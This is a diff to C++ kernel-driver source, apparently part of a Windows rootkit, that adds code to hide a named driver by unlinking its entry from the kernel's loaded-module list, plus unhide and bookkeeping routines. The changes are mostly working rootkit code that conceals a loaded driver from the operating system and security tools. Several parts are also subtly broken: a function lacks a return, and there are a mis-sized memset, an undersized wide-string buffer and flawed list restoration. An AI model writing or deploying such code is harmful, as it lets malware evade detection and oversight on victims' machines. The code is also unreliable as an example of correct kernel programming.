@@ -2,11 +2,23 @@
 #include "MemoryUtils.hpp"
 
 MemoryUtils::MemoryUtils() {
+	this->hiddenDrivers.Count = 0;
 	this->NtCreateThreadEx = NULL;
 	this->ssdt = NULL;
 
 	if (NT_SUCCESS(GetSSDTAddress()))
 		this->NtCreateThreadEx = (tNtCreateThreadEx)GetSSDTFunctionAddress("NtCreateThreadEx");
+
+	memset(this->hiddenDrivers.Items, 0, sizeof(this->hiddenDrivers.Items));
+}
+
+MemoryUtils::~MemoryUtils() {
+	for (ULONG i = 0; i < this->hiddenDrivers.Count; i++) {
+		RemoveHiddenDriver(i);
+	}
+
+	memset(&this->hiddenDrivers, 0, this->hiddenDrivers.Count);
+	this->hiddenDrivers.Count = 0;
 }
 
 /*
@@ -477,34 +489,65 @@ NTSTATUS MemoryUtils::HideModule(HiddenModuleInformation* ModuleInformation) {
 * Returns:
 * @status			 [NTSTATUS]					-- Whether successfuly hidden or not.
 */
-NTSTATUS MemoryUtils::HideDriver(HiddenDriverInformation * DriverInformation) {
+NTSTATUS MemoryUtils::HideDriver(HiddenDriverInformation* DriverInformation) {
+	HiddenDriverItem hiddenDriver{};
 	PKLDR_DATA_TABLE_ENTRY loadedModulesEntry = NULL;
-	NTSTATUS status = STATUS_SUCCESS;
+	NTSTATUS status = STATUS_NOT_FOUND;
 
-	if (DriverInformation->Hide) {
-		status = STATUS_NOT_FOUND;
+	for (PLIST_ENTRY pListEntry = PsLoadedModuleList->InLoadOrderLinks.Flink;
+		pListEntry != &PsLoadedModuleList->InLoadOrderLinks;
+		pListEntry = pListEntry->Flink) {
 
-		for (PLIST_ENTRY pListEntry = PsLoadedModuleList->InLoadOrderLinks.Flink;
-			pListEntry != &PsLoadedModuleList->InLoadOrderLinks;
-			pListEntry = pListEntry->Flink) {
+		loadedModulesEntry = CONTAINING_RECORD(pListEntry, KLDR_DATA_TABLE_ENTRY, InLoadOrderLinks);
 
-			loadedModulesEntry = CONTAINING_RECORD(pListEntry, KLDR_DATA_TABLE_ENTRY, InLoadOrderLinks);
+		if (_wcsnicmp(loadedModulesEntry->FullDllName.Buffer, DriverInformation->DriverName,
+						loadedModulesEntry->FullDllName.Length / sizeof(wchar_t) - 4) == 0) {
 
-			KdPrint((DRIVER_PREFIX "%ws\n", loadedModulesEntry->FullDllName.Buffer));
-			if (_wcsnicmp(loadedModulesEntry->FullDllName.Buffer, DriverInformation->DriverName,
-							loadedModulesEntry->FullDllName.Length / sizeof(wchar_t) - 4) == 0) {
-				// Copying the original entry to make sure it can be restored again.
-				RemoveEntryList(&loadedModulesEntry->InLoadOrderLinks);
-				status = STATUS_SUCCESS;
+			// Copying the original entry to make sure it can be restored again.
+			hiddenDriver.DriverName = DriverInformation->DriverName;
+			hiddenDriver.originalEntry = loadedModulesEntry;
+
+			if (!AddHiddenDriver(hiddenDriver)) {
+				status = STATUS_ABANDONED;
 				break;
 			}
+
+			RemoveEntryList(&loadedModulesEntry->InLoadOrderLinks);
+			status = STATUS_SUCCESS;
+			break;
 		}
-	}
-	else {
-		
 	}
 
 	return status;
+}
+
+/*
+* Description:
+* UnhideDriver is responsible for restoring a kernel driver.
+*
+* Parameters:
+* @DriverInformation [HiddenDriverInformation*] -- Required information, contains the driver's information.
+*
+* Returns:
+* @status			 [NTSTATUS]					-- Whether successfuly unhidden or not.
+*/
+NTSTATUS MemoryUtils::UnhideDriver(HiddenDriverInformation* DriverInformation) {
+	HiddenDriverItem hiddenDriver{};
+	PKLDR_DATA_TABLE_ENTRY loadedModulesEntry = NULL;
+	NTSTATUS status = STATUS_NOT_FOUND;
+
+	hiddenDriver.DriverName = DriverInformation->DriverName;
+	ULONG driverIndex = FindHiddenDriver(hiddenDriver);
+
+	if (driverIndex == ITEM_NOT_FOUND)
+		return status;
+
+	PLIST_ENTRY pListEntry = PsLoadedModuleList->InLoadOrderLinks.Flink;
+	loadedModulesEntry = CONTAINING_RECORD(pListEntry, KLDR_DATA_TABLE_ENTRY, InLoadOrderLinks);
+	InsertTailList(&loadedModulesEntry->InLoadOrderLinks, (PLIST_ENTRY)(this->hiddenDrivers.Items[driverIndex].originalEntry));
+
+	if (RemoveHiddenDriver(driverIndex))
+		status = STATUS_SUCCESS;
 }
 
 /*
@@ -1156,6 +1199,108 @@ CleanUp:
 	}
 
 	return status;
+}
+
+/*
+* Description:
+* FindHiddenDriver is responsible for searching if an item exists in the list of hidden drivers.
+*
+* Parameters:
+* @item	  [HiddenDriverItem*] -- Driver to search for.
+*
+* Returns:
+* @status [ULONG]			  -- If found the index else ITEM_NOT_FOUND.
+*/
+ULONG MemoryUtils::FindHiddenDriver(HiddenDriverItem item) {
+	for (ULONG i = 0; i < this->hiddenDrivers.Count; i++)
+		if (_wcsicmp(this->hiddenDrivers.Items[i].DriverName, item.DriverName) == 0)
+			return i;
+	return ITEM_NOT_FOUND;
+}
+
+/*
+* Description:
+* AddHiddenDriver is responsible for adding an item to the list of hidden drivers.
+*
+* Parameters:
+* @item	  [HiddenDriverItem] -- Driver to add.
+*
+* Returns:
+* @status [bool]			 -- Whether successfully added or not.
+*/
+bool MemoryUtils::AddHiddenDriver(HiddenDriverItem item) {
+	for (ULONG i = 0; i < MAX_HIDDEN_DRIVERS; i++)
+		if (this->hiddenDrivers.Items[i].DriverName == nullptr) {
+			WCHAR* buffer = (WCHAR*)ExAllocatePoolWithTag(PagedPool, wcslen(item.DriverName) * sizeof(WCHAR) + 1, DRIVER_TAG);
+
+			if (!buffer)
+				return false;
+
+			memset(buffer, 0, wcslen(item.DriverName) * sizeof(WCHAR) + 1);
+
+			__try {
+				RtlCopyMemory(buffer, item.DriverName, wcslen(item.DriverName) * sizeof(WCHAR));
+			}
+			__except (EXCEPTION_EXECUTE_HANDLER) {
+				ExFreePoolWithTag(buffer, DRIVER_TAG);
+				return false;
+			}
+			
+			this->hiddenDrivers.Items[i].DriverName = buffer;
+			this->hiddenDrivers.Items[i].originalEntry = item.originalEntry;
+			this->hiddenDrivers.Count++;
+			return true;
+		}
+	return false;
+}
+
+/*
+* Description:
+* RemoveProcess is responsible for remove an item from the list of hidden drivers.
+*
+* Parameters:
+* @item	  [HiddenDriverItem] -- Driver to remove.
+*
+* Returns:
+* @status [bool]			 -- Whether successfully removed or not.
+*/
+bool MemoryUtils::RemoveHiddenDriver(HiddenDriverItem item) {
+	for (ULONG i = 0; i < this->hiddenDrivers.Count; i++) {
+		if (this->hiddenDrivers.Items[i].DriverName != nullptr)
+			if (_wcsicmp(this->hiddenDrivers.Items[i].DriverName, item.DriverName) == 0) {
+				ExFreePoolWithTag(this->hiddenDrivers.Items[i].DriverName, DRIVER_TAG);
+				this->hiddenDrivers.Items[i].DriverName = NULL;
+				this->hiddenDrivers.Items[i].originalEntry = NULL;
+				this->hiddenDrivers.Count--;
+				return true;
+			}
+	}
+
+	return false;
+}
+
+/*
+* Description:
+* RemoveProcess is responsible for remove an item from the list of hidden drivers (by index).
+*
+* Parameters:
+* @index	  [ULONG] -- Index of the driver to remove.
+*
+* Returns:
+* @status	  [bool]  -- Whether successfully removed or not.
+*/
+bool MemoryUtils::RemoveHiddenDriver(ULONG index) {
+	if (index < MAX_HIDDEN_DRIVERS && index < this->hiddenDrivers.Count) {
+		if (this->hiddenDrivers.Items[index].DriverName != nullptr) {
+			ExFreePoolWithTag(this->hiddenDrivers.Items[index].DriverName, DRIVER_TAG);
+			this->hiddenDrivers.Items[index].DriverName = NULL;
+			this->hiddenDrivers.Items[index].originalEntry = NULL;
+			this->hiddenDrivers.Count--;
+			return true;
+		}
+	}
+
+	return false;
 }
 
 /*
